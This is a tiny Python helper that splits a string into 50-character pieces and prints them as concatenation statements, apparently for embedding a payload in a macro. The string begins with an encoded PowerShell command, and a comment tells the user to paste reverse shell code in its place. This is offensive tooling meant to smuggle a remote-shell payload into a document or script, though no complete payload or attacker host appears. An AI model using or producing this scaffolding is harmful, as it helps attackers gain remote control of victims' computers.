str="powershell -e JAQBu="		//Paste the Reverse shell Code over here
n=50
for i in range(0,len(str),n):
    print("Str = str+" + '"' + str[i:i+n] +'"')